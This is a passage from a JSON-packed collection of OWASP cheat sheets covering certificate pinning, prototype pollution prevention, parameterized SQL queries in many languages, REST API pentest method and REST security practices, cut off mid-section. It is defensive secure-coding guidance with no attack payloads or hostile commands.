of two places with OpenSSL. First is the user supplied `verify_callback`. Second is after the connection is established via `SSL_get_peer_certificate`. Either method will allow you to access the peer's certificate.\r\n\r\nThough OpenSSL performs the X509 checks, you must fail the connection and tear down the socket on error. By design, a server that does not supply a certificate will result in `X509_V_OK` with a **NULL** certificate. To check the result of the customary verification:\r\n\r\n1. You must call `SSL_get_verify_result` and verify the return code is `X509_V_OK`;\r\n2. You must call `SSL_get_peer_certificate` and verify the certificate is **non-NULL**.\r\n\r\nDownload: [OpenSSL sample program](../assets/Pinning_Cheat_Sheet_Certificate_OpenSSLSample.zip).\r\n\r\n### Electron\r\n\r\n[electron-ssl-pinning](https://github.com/dialogs/electron-ssl-pinning), an open-source SSL pinning library for [Electron](https://electronjs.org) based applications. It provides an easy-to-use API for implementing pinning and also provides tool for fetching configuration based on needed hosts.\r\n\r\nOtherwise, you can validate certificates by yourself using [ses.setCertificateVerifyProc(proc)](https://electronjs.org/docs/api/session#sessetcertificateverifyprocproc).\r\n\r\n## References\r\n\r\n- OWASP [Injection Theory](https://owasp.org/www-community/Injection_Theory)\r\n- OWASP [Data Validation](https://wiki.owasp.org/index.php/Data_Validation)\r\n- OWASP [Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md)\r\n- OWASP [Mobile Security Testing Guide](https://github.com/OWASP/owasp-mstg)\r\n- IETF [RFC 1421 (PEM Encoding)](http://www.ietf.org/rfc/rfc1421.txt)\r\n- IETF [RFC 4648 (Base16, Base32, and Base64 Encodings)](http://www.ietf.org/rfc/rfc4648.txt)\r\n- IETF [RFC 5280 (Internet X.509, PKIX)](http://www.ietf.org/rfc/rfc5280.txt)\r\n- IETF [RFC 3279 (PKI, X509 Algorithms and CRL Profiles)](http://www.ietf.org/rfc/rfc3279.txt)\r\n- IETF [RFC 4055 (PKI, X509 Additional Algorithms and CRL Profiles)](http://www.ietf.org/rfc/rfc4055.txt)\r\n- IETF [RFC 2246 (TLS 1.0)](http://www.ietf.org/rfc/rfc2246.txt)\r\n- IETF [RFC 4346 (TLS 1.1)](http://www.ietf.org/rfc/rfc4346.txt)\r\n- IETF [RFC 5246 (TLS 1.2)](http://www.ietf.org/rfc/rfc5246.txt)\r\n- IETF [PKCS #1: RSA Cryptography Specifications Version 2.2](https://tools.ietf.org/html/rfc8017)\r\n"
    },
    {
      "Prototype_Pollution_Prevention_Cheat_Sheet.md": "# Prototype Pollution Prevention Cheat Sheet\r\n\r\n## Explanation\r\n\r\nPrototype Pollution is a critical vulnerability that can allow attackers to manipulate an application's JavaScript objects and properties, leading to serious security issues such as unauthorized access to data, privilege escalation, and even remote code execution.\r\n\r\nFor examples of why this is dangerous, see the links in the [Other resources](#other-resources) section below.\r\n\r\n## Suggested protection mechanisms\r\n\r\n### Use \"new Set()\" or \"new Map()\"\r\n\r\nDevelopers should use `new Set()` or `new Map()` instead of using object literals:\r\n\r\n```javascript\r\nlet allowedTags = new Set();\r\nallowedTags.add('b');\r\nif(allowedTags.has('b')){\r\n  //...\r\n}\r\n\r\nlet options = new Map();\r\noptions.set('spaces', 1);\r\nlet spaces = options.get('spaces')\r\n```\r\n\r\n### If objects or object literals are required\r\n\r\nIf objects have to be used then they should be created using the `Object.create(null)` API to ensure they don't inherit from the Object prototype:\r\n\r\n```javascript\r\nlet obj = Object.create(null);\r\n```\r\n\r\nIf object literals are required then as a last resort you could use the `__proto__` property:\r\n\r\n```javascript\r\nlet obj = {__proto__:null};\r\n```\r\n\r\n### Use object \"freeze\" and \"seal\" mechanisms\r\n\r\nYou can also use the `Object.freeze()` and `Object.seal()` APIs to prevent built-in prototypes from being modified however this can break the application if the libraries they use modify the built-in prototypes.\r\n\r\n### Node.js configuration flag\r\n\r\nNode.js also offers the ability to remove the `__proto__` property completely using the `--disable-proto=delete` flag. Note this is a defense in depth measure.\r\n\r\nPrototype pollution is still possible using `constructor.prototype` properties but removing `__proto__` helps reduce attack surface and prevent certain attacks.\r\n\r\n### Other resources\r\n\r\n- [What is prototype pollution? (Portswigger Web Security Academy)](https://portswigger.net/web-security/prototype-pollution)\r\n- [Prototype pollution (Snyk Learn)](https://learn.snyk.io/lessons/prototype-pollution/javascript/)\r\n\r\n### Credits\r\n\r\nCredit to [Gareth Hayes](https://garethheyes.co.uk/) for providing the original protection guidance [in this comment](https://github.com/OWASP/ASVS/issues/1563#issuecomment-1470027723).\r\n"
    },
    {
      "Query_Parameterization_Cheat_Sheet.md": "# Query Parameterization Cheat Sheet\r\n\r\n## Introduction\r\n\r\n[SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) is one of the most dangerous web vulnerabilities. So much so that it was the #1 item in both the OWASP Top 10 [2013 version](https://wiki.owasp.org/index.php/Top_10_2013-A1-Injection), and [2017 version](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html). As of 2021, it sits at #3 on the [OWASP Top 10](https://owasp.org/Top10/A03_2021-Injection/).\r\n\r\nIt represents a serious threat because SQL Injection allows evil attacker code to change the structure of a web application's SQL statement in a way that can steal data, modify data, or potentially facilitate command injection to the underlying OS.\r\n\r\nThis cheat sheet is a derivative work of the [SQL Injection Prevention Cheat Sheet](SQL_Injection_Prevention_Cheat_Sheet.md).\r\n\r\n## Parameterized Query Examples\r\n\r\nSQL Injection is best prevented through the use of [*parameterized queries*](SQL_Injection_Prevention_Cheat_Sheet.md). The following chart demonstrates, with real-world code samples, how to build parameterized queries in most of the common web languages. The purpose of these code samples is to demonstrate to the web developer how to avoid SQL Injection when building database queries within a web application.\r\n\r\nPlease note, many client side frameworks and libraries offer client side query parameterization. These libraries often just build queries with string concatenation before sending raw queries to a server. Please ensure that query parameterization is done server-side!\r\n\r\n### Prepared Statement Examples\r\n\r\n#### Using Java built-in feature\r\n\r\n```java\r\nString custname = request.getParameter(\"customerName\");\r\nString query = \"SELECT account_balance FROM user_data WHERE user_name = ? \";  \r\nPreparedStatement pstmt = connection.prepareStatement( query );\r\npstmt.setString( 1, custname);\r\nResultSet results = pstmt.executeQuery( );\r\n```\r\n\r\n#### Using Java with Hibernate\r\n\r\n```java\r\n// HQL\r\n@Entity // declare as entity;\r\n@NamedQuery(\r\n name=\"findByDescription\",\r\n query=\"FROM Inventory i WHERE i.productDescription = :productDescription\"\r\n)\r\npublic class Inventory implements Serializable {\r\n @Id\r\n private long id;\r\n private String productDescription;\r\n}\r\n\r\n// Use case\r\n// This should REALLY be validated too\r\nString userSuppliedParameter = request.getParameter(\"Product-Description\");\r\n// Perform input validation to detect attacks\r\nList<Inventory> list =\r\n session.getNamedQuery(\"findByDescription\")\r\n .setParameter(\"productDescription\", userSuppliedParameter).list();\r\n\r\n// Criteria API\r\n// This should REALLY be validated too\r\nString userSuppliedParameter = request.getParameter(\"Product-Description\");\r\n// Perform input validation to detect attacks\r\nInventory inv = (Inventory) session.createCriteria(Inventory.class).add\r\n(Restrictions.eq(\"productDescription\", userSuppliedParameter)).uniqueResult();\r\n```\r\n\r\n#### Using .NET built-in feature\r\n\r\n```csharp\r\nString query = \"SELECT account_balance FROM user_data WHERE user_name = ?\";\r\ntry {\r\n   OleDbCommand command = new OleDbCommand(query, connection);\r\n   command.Parameters.Add(new OleDbParameter(\"customerName\", CustomerName Name.Text));\r\n   OleDbDataReader reader = command.ExecuteReader();\r\n   // …\r\n} catch (OleDbException se) {\r\n   // error handling\r\n}\r\n```\r\n\r\n#### Using ASP .NET built-in feature\r\n\r\n```csharp\r\nstring sql = \"SELECT * FROM Customers WHERE CustomerId = @CustomerId\";\r\nSqlCommand command = new SqlCommand(sql);\r\ncommand.Parameters.Add(new SqlParameter(\"@CustomerId\", System.Data.SqlDbType.Int));\r\ncommand.Parameters[\"@CustomerId\"].Value = 1;\r\n```\r\n\r\n#### Using Ruby with ActiveRecord\r\n\r\n```ruby\r\n## Create\r\nProject.create!(:name => 'owasp')\r\n## Read\r\nProject.all(:conditions => \"name = ?\", name)\r\nProject.all(:conditions => { :name => name })\r\nProject.where(\"name = :name\", :name => name)\r\n## Update\r\nproject.update_attributes(:name => 'owasp')\r\n## Delete\r\nProject.delete(:name => 'name')\r\n```\r\n\r\n#### Using Ruby built-in feature\r\n\r\n```ruby\r\ninsert_new_user = db.prepare \"INSERT INTO users (name, age, gender) VALUES (?, ? ,?)\"\r\ninsert_new_user.execute 'aizatto', '20', 'male'\r\n```\r\n\r\n#### Using PHP with PHP Data Objects\r\n\r\n```php\r\n$stmt = $dbh->prepare(\"INSERT INTO REGISTRY (name, value) VALUES (:name, :value)\");\r\n$stmt->bindParam(':name', $name);\r\n$stmt->bindParam(':value', $value);\r\n```\r\n\r\n#### Using Cold Fusion built-in feature\r\n\r\n```coldfusion\r\n<cfquery name = \"getFirst\" dataSource = \"cfsnippets\">\r\n    SELECT * FROM #strDatabasePrefix#_courses WHERE intCourseID =\r\n    <cfqueryparam value = #intCourseID# CFSQLType = \"CF_SQL_INTEGER\">\r\n</cfquery>\r\n```\r\n\r\n#### Using PERL with Database Independent Interface\r\n\r\n```perl\r\nmy $sql = \"INSERT INTO foo (bar, baz) VALUES ( ?, ? )\";\r\nmy $sth = $dbh->prepare( $sql );\r\n$sth->execute( $bar, $baz );\r\n```\r\n\r\n#### Using Rust with SQLx\r\n<!-- contributed by GeekMasher -->\r\n\r\n```rust\r\n// Input from CLI args but could be anything\r\nlet username = std::env::args().last().unwrap();\r\n\r\n// Using build-in macros (compile time checks)\r\nlet users = sqlx::query_as!(\r\n        User,\r\n        \"SELECT * FROM users WHERE name = ?\",\r\n        username\r\n    )\r\n    .fetch_all(&pool)\r\n    .await \r\n    .unwrap();\r\n\r\n// Using built-in functions\r\nlet users: Vec<User> = sqlx::query_as::<_, User>(\r\n        \"SELECT * FROM users WHERE name = ?\"\r\n    )\r\n    .bind(&username)\r\n    .fetch_all(&pool)\r\n    .await\r\n    .unwrap();\r\n```\r\n\r\n### Stored Procedure Examples\r\n\r\nThe SQL you write in your web application isn't the only place that SQL injection vulnerabilities can be introduced. If you are using Stored Procedures, and you are dynamically constructing SQL inside them, you can also introduce SQL injection vulnerabilities.\r\n\r\nDynamic SQL can be parameterized using bind variables, to ensure the dynamically constructed SQL is secure.\r\n\r\nHere are some examples of using bind variables in stored procedures in different databases.\r\n\r\n#### Oracle using PL/SQL\r\n\r\n##### Normal Stored Procedure\r\n\r\nNo dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required:\r\n\r\n```sql\r\nPROCEDURE SafeGetBalanceQuery(UserID varchar, Dept varchar) AS BEGIN\r\n   SELECT balance FROM accounts_table WHERE user_ID = UserID AND department = Dept;\r\nEND;\r\n```\r\n\r\n##### Stored Procedure Using Bind Variables in SQL Run with EXECUTE\r\n\r\nBind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code:\r\n\r\n```sql\r\nPROCEDURE AnotherSafeGetBalanceQuery(UserID varchar, Dept varchar)\r\n          AS stmt VARCHAR(400); result NUMBER;\r\nBEGIN\r\n   stmt := 'SELECT balance FROM accounts_table WHERE user_ID = :1\r\n            AND department = :2';\r\n   EXECUTE IMMEDIATE stmt INTO result USING UserID, Dept;\r\n   RETURN result;\r\nEND;\r\n```\r\n\r\n#### SQL Server using Transact-SQL\r\n\r\n##### Normal Stored Procedure\r\n\r\nNo dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required:\r\n\r\n```sql\r\nPROCEDURE SafeGetBalanceQuery(@UserID varchar(20), @Dept varchar(10)) AS BEGIN\r\n   SELECT balance FROM accounts_table WHERE user_ID = @UserID AND department = @Dept\r\nEND\r\n```\r\n\r\n##### Stored Procedure Using Bind Variables in SQL Run with EXEC\r\n\r\nBind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code:\r\n\r\n```sql\r\nPROCEDURE SafeGetBalanceQuery(@UserID varchar(20), @Dept varchar(10)) AS BEGIN\r\n   DECLARE @sql VARCHAR(200)\r\n   SELECT @sql = 'SELECT balance FROM accounts_table WHERE '\r\n                 + 'user_ID = @UID AND department = @DPT'\r\n   EXEC sp_executesql @sql,\r\n                      '@UID VARCHAR(20), @DPT VARCHAR(10)',\r\n                      @UID=@UserID, @DPT=@Dept\r\nEND\r\n```\r\n\r\n## References\r\n\r\n- [The Bobby Tables site (inspired by the XKCD webcomic) has numerous examples in different languages of parameterized Prepared Statements and Stored Procedures](http://bobby-tables.com/)\r\n- OWASP [SQL Injection Prevention Cheat Sheet](SQL_Injection_Prevention_Cheat_Sheet.md)\r\n"
    },
    {
      "REST_Assessment_Cheat_Sheet.md": "# REST Assessment Cheat Sheet\r\n\r\n## About RESTful Web Services\r\n\r\nWeb Services are an implementation of web technology used for machine to machine communication. As such they are used for Inter application communication, Web 2.0 and Mashups and by desktop and mobile applications to call a server.\r\n\r\nRESTful web services (often called simply REST) are a light weight variant of Web Services based on the RESTful design pattern. In practice RESTful web services utilizes HTTP requests that are similar to regular HTTP calls in contrast with other Web Services technologies such as SOAP which utilizes a complex protocol.\r\n\r\n## Key relevant properties of RESTful web services\r\n\r\n- Use of HTTP methods (`GET`, `POST`, `PUT` and `DELETE`) as the primary verb for the requested operation.\r\n- Non-standard parameters specifications:\r\n    - As part of the URL.\r\n    - In headers.\r\n- Structured parameters and responses using JSON or XML in a parameter values, request body or response body. Those are required to communicate machine useful information.\r\n- Custom authentication and session management, often utilizing custom security tokens: this is needed as machine to machine communication does not allow for login sequences.\r\n- Lack of formal documentation. A [proposed standard for describing RESTful web services called WADL](http://www.w3.org/Submission/wadl/) was submitted by Sun Microsystems but was never officially adapted.\r\n\r\n## The challenge of security testing RESTful web services\r\n\r\n- Inspecting the application does not reveal the attack surface, I.e. the URLs and parameter structure used by the RESTful web service. The reasons are:\r\n    - No application utilizes all the available functions and parameters exposed by the service\r\n    - Those used are often activated dynamically by client side code and not as links in pages.\r\n    - The client application is often not a web application and does not allow inspection of the activating link or even relevant code.\r\n- The parameters are none standard making it hard to determine what is just part of the URL or a constant header and what is a parameter worth [fuzzing](https://owasp.org/www-community/Fuzzing).\r\n- As a machine interface the number of parameters used can be very large, for example a JSON structure may include dozens of parameters. [fuzzing](https://owasp.org/www-community/Fuzzing) each one significantly lengthen the time required for testing.\r\n- Custom authentication mechanisms require reverse engineering and make popular tools not useful as they cannot track a login session.\r\n\r\n## How to pentest a RESTful web service\r\n\r\nDetermine the attack surface through documentation - RESTful pen testing might be better off if some level of white box testing is allowed and you can get information about the service.\r\n\r\nThis information will ensure fuller coverage of the attack surface. Such information to look for:\r\n\r\n- Formal service description - While for other types of web services such as SOAP a formal description, usually in WSDL is often available, this is seldom the case for REST. That said, either WSDL 2.0 or WADL can describe REST and are sometimes used.\r\n- A developer guide for using the service may be less detailed but will commonly be found, and might even be considered *black box*.\r\n- Application source or configuration - in many frameworks, including dotNet ,the REST service definition might be easily obtained from configuration files rather than from code.\r\n\r\nCollect full requests using a [proxy](https://www.zaproxy.org/) - while always an important pen testing step, this is more important for REST based applications as the application UI may not give clues on the actual attack surface.\r\n\r\nNote that the proxy must be able to collect full requests and not just URLs as REST services utilize more than just GET parameters.\r\n\r\nAnalyze collected requests to determine the attack surface:\r\n\r\n- Look for non-standard parameters:\r\n    - Look for abnormal HTTP headers - those would many times be header based parameters.\r\n    - Determine if a URL segment has a repeating pattern across URLs. Such patterns can include a date, a number or an ID like string and indicate that the URL segment is a URL embedded parameter.\r\n        - For example: `http://server/srv/2013-10-21/use.php`\r\n    - Look for structured parameter values - those may be JSON, XML or a non-standard structure.\r\n    - If the last element of a URL does not have an extension, it may be a parameter. This is especially true if the application technology normally uses extensions or if a previous segment does have an extension.\r\n        - For example: `http://server/svc/Grid.asmx/GetRelatedListItems`\r\n    - Look for highly varying URL segments - a single URL segment that has many values may be parameter and not a physical directory.\r\n        - For example if the URL `http://server/src/XXXX/page` repeats with hundreds of value for `XXXX`, chances `XXXX` is a parameter.\r\n\r\nVerify non-standard parameters: in some cases (but not all), setting the value of a URL segment suspected of being a parameter to a value expected to be invalid can help determine if it is a path elements of a parameter. If a path element, the web server will return a *404* message, while for an invalid value to a parameter the answer would be an application level message as the value is legal at the web server level.\r\n\r\nAnalyzing collected requests to optimize [fuzzing](https://owasp.org/www-community/Fuzzing) - after identifying potential parameters to fuzz, analyze the collected values for each to determine:\r\n\r\n- Valid vs. invalid values, so that [fuzzing](https://owasp.org/www-community/Fuzzing) can focus on marginal invalid values.\r\n    - For example sending *0* for a value found to be always a positive integer.\r\n- Sequences allowing to fuzz beyond the range presumably allocated to the current user.\r\n\r\nLastly, when [fuzzing](https://owasp.org/www-community/Fuzzing), don't forget to emulate the authentication mechanism used.\r\n\r\n## Related Resources\r\n\r\n- [REST Security Cheat Sheet](REST_Security_Cheat_Sheet.md) - the other side of this cheat sheet\r\n- [RESTful services, web security blind spot](https://xiom.com/2016/10/31/restful-services-web-security-blind-spot/) - a presentation (including video) elaborating on most of the topics on this cheat sheet.\r\n"
    },
    {
      "REST_Security_Cheat_Sheet.md": "# REST Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\n[REST](http://en.wikipedia.org/wiki/Representational_state_transfer) (or **RE**presentational **S**tate **T**ransfer) is an architectural style first described in [Roy Fielding](https://en.wikipedia.org/wiki/Roy_Fielding)'s Ph.D. dissertation on [Architectural Styles and the Design of Network-based Software Architectures](https://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm).\r\n\r\nIt evolved as Fielding wrote the HTTP/1.1 and URI specs and has been proven to be well-suited for developing distributed hypermedia applications. While REST is more widely applicable, it is most commonly used within the context of communicating with services via HTTP.\r\n\r\nThe key abstraction of information in REST is a resource. A REST API resource is identified by a URI, usually a HTTP URL. REST components use connectors to perform actions on a resource by using a representation to capture the current or intended state of the resource and transferring that representation.\r\n\r\nThe primary connector types are client and server, secondary connectors include cache, resolver and tunnel.\r\n\r\nREST APIs are stateless. Stateful APIs do not adhere to the REST architectural style. State in the REST acronym refers to the state of the resource which the API accesses, not the state of a session within which the API is called. While there may be good reasons for building a stateful API, it is important to realize that managing sessions is complex and difficult to do securely.\r\n\r\nStateful services are out of scope of this Cheat Sheet: *Passing state from client to backend, while making the service technically stateless, is an anti-pattern that should also be avoided as it is prone to replay and impersonation attacks.*\r\n\r\nIn order to implement flows with REST APIs, resources are typically created, read, updated and deleted. For example, an ecommerce site may offer methods to create an empty shopping cart, to add items to the cart and to check out the cart. Each of these REST calls is stateless and the endpoint should check whether the caller is authorized to perform the requested operation.\r\n\r\nAnother key feature of REST applications is the use of standard HTTP verbs and error codes in the pursuit or removing unnecessary variation among different services.\r\n\r\nAnother key feature of REST applications is the use of [HATEOAS or Hypermedia As The Engine of Application State](https://en.wikipedia.org/wiki/HATEOAS). This provides REST applications a self-documenting nature making it easier for developers to interact with a REST service without prior knowledge.\r\n\r\n## HTTPS\r\n\r\nSecure REST services must only provide HTTPS endpoints. This protects authentication credentials in transit, for example passwords, API keys or JSON Web Tokens. It also allows clients to authenticate the service and guarantees integrity of the transmitted data.\r\n\r\nSee the [Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md) for additional information.\r\n\r\nConsider the use of mutually authenticated client-side certificates to provide additional protection for highly privileged web services.\r\n\r\n## Access Control\r\n\r\nNon-public REST services must perform access control at each API endpoint. Web services in monolithic applications implement this by means of user authentication, authorization logic and session management. This has several drawbacks for modern architectures which compose multiple microservices following the RESTful style.\r\n\r\n- in order to minimize latency and reduce coupling between services, the access control decision should be taken locally by REST endpoints\r\n- user authentication should be centralised in a Identity Provider (IdP), which issues access tokens\r\n\r\n## JWT\r\n\r\nThere seems to be a convergence towards using [JSON Web Tokens](https://tools.ietf.org/html/rfc7519) (JWT) as the format for security tokens. JWTs are JSON data structures containing a set of claims that can be used for access control decisions. A cryptographic signature or message authentication code (MAC) can be used to protect the integrity of the JWT.\r\n\r\n- Ensure JWTs are integrity protected by either a signature or a MAC. Do not allow the unsecured JWTs: `{\"alg\":\"none\"}`.\r\n    - See [here](https://tools.ietf.org/html/rfc7519#section-6.1)\r\n- In general, signatures should be preferred over MACs for integrity protection of JWTs.\r\n\r\nIf MACs are used for integrity protection, every service that is able to validate JWTs can also create new JWTs using the same key. This means that all services using the same key have to mutually trust each other. Another consequence of this is that a compromise of any service also compromises all other services sharing the same key. See [here](https://tools.ietf.org/html/rfc7515#section-10.5) for additional information.\r\n\r\nThe relying party or token consumer validates a JWT by verifying its integrity and claims contained.\r\n\r\n- A relying party must verify the integrity of the JWT based on its own configuration or hard-coded logic. It must not rely on the information of the JWT header to select the verification algorithm. See [here](https://www.chosenplaintext.ca/2015/03/31/jwt-algorithm-confusion.html) and [here](https://www.youtube.com/watch?v=bW5pS4e_MX8>)\r\n\r\nSome claims have been standardized and should be present in JWT used for access controls. At least the following of the standard claims should be verified:\r\n\r\n- `iss` or issuer - is this a trusted issuer? Is it the expected owner of the signing key?\r\n- `aud` or audience - is the relying party in the target audience for this JWT?\r\n- `exp` or expiration time - is the current time before the end of the validity period of this token?\r\n- `nbf` or not before time - is the current time after the start of the validity period of this token?\r\n\r\nAs JWTs contain details of the authenticated entity (user etc.) a disconnect can occur between the JWT and the current state of the users session, for example, if the session is terminated earlier than the expiration time due to an explicit logout or an idle timeout. When an explicit session termination event occurs, a digest or hash of any associated JWTs should be submitted to a block list on the API which will invalidate that JWT for any requests until the expiration of the token. See the [JSON_Web_Token_for_Java_Cheat_Sheet](JSON_Web_Token_for_Java_Cheat_Sheet.md#token-explicit-revocation-by-the-user) for further details.\r\n\r\n## API Keys\r\n\r\nPublic REST services without access control run the risk of being farmed leading to excessive bills for bandwidth or compute cycles. API keys can be used to mitigate this risk. They are also often used by organisation to monetize APIs; instead of blocking high-frequency calls, clients are given access in accordance to a purchased access plan.\r\n\r\nAPI keys can reduce the impact of denial-of-service attacks. However, when they are issued to third-party clients, they are relatively easy to compromise.\r\n\r\n- Require API keys for every request to the protected endpoint.\r\n- Return `429 Too Many Requests` HTTP response code if requests are coming in too quickly.\r\n- Revoke the API key if the client violates the usage agreement.\r\n- Do not rely exclusively on API keys to protect sensitive, critical or high-value resources.\r\n\r\n## Restrict HTTP methods\r\n\r\n- Apply an allow list of permitted HTTP Methods e.g. `GET`, `POST`, `PUT`.\r\n- Reject all requests not matching the allow list with HTTP response code `405 Method not allowed`.\r\n- Make sure the caller is authorised to use the incoming HTTP method on the resource collection, action, and record\r\n\r\nIn Java EE in particular, this can be difficult to implement properly. See [Bypassing Web Authentication and Authorization with HTTP Verb Tampering](../assets/REST_Security_Cheat_Sheet_Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf) for an explanation of this common misconfiguration.\r\n\r\n## Input validation\r\n\r\n- Do not trust input parameters/objects.\r\n- Validate input: length / range / format and type.\r\n- Achieve an implicit input validation by using strong types like numbers, booleans, dates, times or fixed data ranges in API parameters.\r\n- Constrain string inputs with regexps.\r\n- Reject unexpected/illegal content.\r\n- Make use of validation/sanitation libraries or frameworks in your specific language.\r\n- Define an appropriate request size limit and reject requests exceeding the limit with HTTP response status 413 Request Entity Too Large.\r\n- Consider logging input validation failures. Assume that someone who is performing hundreds of failed input validations per second is up to no good.\r\n- Have a look at input validation cheat sheet for comprehensive explanation.\r\n- Use a secure parser for parsing the incoming messages. If you are using XML, make sure to use a parser that is not vulnerable to [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing) and similar attacks.\r\n\r\n## Validate content types\r\n\r\nA REST request or response body should match the intended content type in the header. Otherwise this could cause misinterpretation at the consumer/producer side and lead to code injection/execution.\r\n\r\n- Document all supported content types in your API.\r\n\r\n### Validate request content types\r\n\r\n- Reject requests containing unexpected or missing content type headers with HTTP response status `406 Unacceptable` or `415 Unsupported Media Type`.\r\n- For XML content types ensure appropriate XML parser hardening, see the [XXE cheat sheet](XML_External_Entity_Prevention_Cheat_Sheet.md).\r\n- Avoid accidentally exposing unintended content types by explicitly defining content types e.g. [Jersey](https://jersey.github.io/) (Java) `@consumes(\"application/json\"); @produces(\"application/json\")`. This avoids [XXE-attack](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing) vectors for example.\r\n\r\n### Send safe response content types\r\n\r\nIt is common for REST services to allow multiple response types (e.g. `application/xml` or `application/json`, and the client specifies the preferred order of response types by the Accept header in the request.\r\n\r\n- **Do NOT** simply copy the `Accept` header to the `Content-type` header of the response.\r\n- Reject the request (ideally with a `406 Not Acceptable` response) if the `Accept` header does not specifically contain one of the allowable types.\r\n\r\nServices including script code (e.g. JavaScript) in their responses must be especially careful to defend against header injection attack.\r\n\r\n- Ensure sending intended content type headers in your response matching your body content e.g. `application/json` and not `application/javascript`.\r\n\r\n## Management endpoints\r\n\r\n- Avoid exposing management endpoints via Internet.\r\n- If management endpoints must be accessible via the Internet, make sure that users must use a strong authentication mechanism, e.g. multi-factor.\r\n- Expose management endpoints via different HTTP ports or hosts preferably on a different NIC and restricted subnet.\r\n- Restrict access to these endpoints by firewall rules  or use of access control lists.\r\n\r\n## Error handling\r\n\r\n- Respond with generic error messages - avoid revealing details of the failure unnecessarily.\r\n- Do not pass technical details (e.g. call stacks or other internal hints) to the client.\r\n\r\n## Audit logs\r\n\r\n- Write audit logs before and after security related events.\r\n- Consider logging token validation errors in order to detect attacks.\r\n- Take care of log injection attacks by sanitizing log data beforehand.\r\n\r\n## Security Headers\r\n\r\nThere are a number of [security related headers](https://owasp.org/www-project-secure-headers/) that can be returned in the HTTP responses to instruct browsers to act in specific ways. However, some of these headers are intended to be used with HTML responses, and as such may provide little or no security benefits on an API that does not return HTML.\r\n\r\nThe following headers should be included in all API responses:\r\n\r\n| Header | Rationale |\r\n|--------|-----------|\r\n| `Cache-Control: no-store` | Header used to direct caching done by browsers. Providing `no-store` indicates that any caches of any kind (private or shared) should not store the response that contains the header. A browser must make a new request everytime the API is called to fetch the latest response. This header with a `no-store` value prevents sensitive information from being cached or stored. |\r\n| `Content-Security-Policy: frame-ancestors 'none'` | Header used to specify whether a response can be framed in a `<frame>`, `<iframe>`, `<embed>` or `<object>` element. For an API response, there is no requirement to be framed in any of those elements. Providing `frame-ancestors 'none'` prevents any domain from framing the response returned by the API call. This header protects against [drag-and-drop](https://www.w3.org/Security/wiki/Clickjacking_Threats#Drag_and_drop_attacks) style clickjacking attacks. |\r\n| `Content-Type` | Header to specify the content type of a response. This must be specified as per the type of content returned by an API call. If not specified or if specified incorrectly, a browser might attempt to guess the content type of the response. This can return in MIME sniffing attacks. One common content type value is `application/json` if the API response is JSON. |\r\n| `Strict-Transport-Security` | Header to instruct a browser that the domain should only be accessed using HTTPS, and that any future attempts to access it using HTTP should automatically be converted to HTTPS. This header ensures that API calls are made over HTTPS and protects against spoofed certificates. |\r\n| `X-Content-Type-Options: nosniff` | Header to instruct a browser to always use the MIME type that is declared in the `Content-Type` header rather than trying to determine the MIME type based on the file's content. This header with a `nosniff` value prevents browsers from performing MIME sniffing, and inappropriately interpreting responses as HTML. |\r\n| `X-Frame-Options: DENY` | Header used to specify whether a response can be framed in a `<frame>`, `<iframe>`, `<embed>` or `<object>` element. For an API response, there is no requirement to be framed in any of those elements. Providing `DENY` prevents any domain from framing the response returned by the API call. This header with a `DENY` value protects protect against [drag-and-drop](https://www.w3.org/Security/wiki/Clickjacking_Threats#Drag_and_drop_attacks) style clickjacking attacks. |\r\n\r\nThe headers below are only intended to provide additional security when responses are rendered as HTML. As such, if the API will **never** return HTML in responses, then these headers may not be necessary. However, if there is any uncertainty about the function of the headers, or the types of information that the API returns (or may return in future), then it is recommended to include them as part of a defence-in-depth approach.\r\n\r\n| Header | Example | Rationale |\r\n|--------|-----------|-----------|\r\n| Content-Security-Policy | `Content-Security-Policy: default-src 'none'` | The majority of CSP functionality only affects pages rendered as HTML. |\r\n| Permissions-Policy | `Permissions-Policy: accelerometer=(), ambient-light-sensor=(), autoplay=(), battery=(), camera=(), cross-origin-isolated=(), display-capture=(), document-domain=(), encrypted-media=(), execution-while-not-rendered=(), execution-while-out-of-viewport=(), fullscreen=(), geolocation=(), gyroscope=(), keyboard-map=(), magnetometer=(), microphone=(), midi=(), navigation-override=(), payment=(), picture-in-picture=(), publickey-credentials-get=(), screen-wake-lock=(), sync-xhr=(), usb=(), web-share=(), xr-spatial-tracking=()` | This header used to be named Feature-Policy. When browsers heed this header, it is used to control browser features via directives. The example disables features with an empty allowlist for a number of permitted [directive names](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy#directives). When you apply this header, verify that the directives are up-to-date and fit your needs. Please have a look at this [article](https://developer.chrome.com/en/docs/privacy-sandbox/permissions-policy) for a detailed explanation on how to control browser features. |\r\n| Referrer-Policy | `Referrer-Policy: no-referrer` | Non-HTML responses should not trigger additional requests. |\r\n\r\n## CORS\r\n\r\nCross-Origin Resource Sharing (CORS) is a W3C standard to flexibly specify what cross-domain requests are permitted. By delivering appropriate CORS Headers your REST API signals to the browser which domains, AKA origins, are allowed to make JavaScript calls to the REST service.\r\n\r\n- Disable CORS headers if cross-domain calls are not supported/expected.\r\n- Be as specific as possible and as general as necessary when setting the origins of cross-domain calls.\r\n\r\n## Sensitive information in HTTP requests\r\n\r\nRESTful web services should be careful to prevent leaking credentials. Passwords, security tokens, and API keys should not appear in the URL, as this can be captured in web server logs, which makes them intrinsically valuable.\r\n\r\n- In `POST`/`PUT` requests sensitive data should be transferred in the request body or request headers.\r\n- In `GET` requests sensitive data should be transferred in an HTTP Header.\r\n\r\n**OK:**\r\n\r\n`https://example.com/resourceCollection/[ID]/action`\r\n\r\n`https://twitter.com/vanderaj/lists`\r\n\r\n**NOT OK:**\r\n\r\n`https://example.com/controller/123/action?apiKey=a53f435643de32` because API Key is into the URL.\r\n\r\n## HTTP Return 